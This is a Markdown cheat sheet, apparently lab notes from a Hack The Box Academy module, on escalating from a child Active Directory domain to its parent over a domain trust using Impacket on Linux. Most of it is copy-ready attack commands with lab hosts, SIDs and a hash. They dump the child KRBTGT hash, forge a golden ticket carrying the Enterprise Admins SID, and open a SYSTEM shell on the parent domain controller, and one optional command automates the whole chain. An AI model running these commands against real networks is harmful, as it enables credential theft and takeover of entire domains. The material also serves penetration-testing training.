# Attacking Domain Trusts - Child - Parent Trusts (Linux)

## Prerequisites

Before performing the attack, gather:

- KRBTGT hash for the **child domain**
- Child domain **SID**
- Target username (can be fictitious)
- Child domain **FQDN**
- Parent domain **Enterprise Admins SID**

---

## Steps

### 1. Dump the KRBTGT Hash

```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

---

### 2. Retrieve the Child Domain SID

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

Filter for the domain SID:

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

---

### 3. Retrieve the Enterprise Admins SID (Parent Domain)

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

---

### 4. Create a Golden Ticket

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f \
-domain LOGISTICS.INLANEFREIGHT.LOCAL \
-domain-sid S-1-5-21-2806153819-209893948-922872689 \
-extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
hacker
```

---

### 5. Export the Ticket

```bash
export KRB5CCNAME=hacker.ccache
```

---

### 6. Gain SYSTEM Shell on Parent Domain DC

```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

---

### 7. Automate the Attack (Optional)

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

---

## Considerations

* `raiseChild.py` automates the chain but understanding each step is crucial.
* Tools like Impacket are powerful and must be used carefully.
* Manual steps help identify misconfigurations and troubleshoot failures.
* Use caution when testing Golden Ticket attacks in real environments.
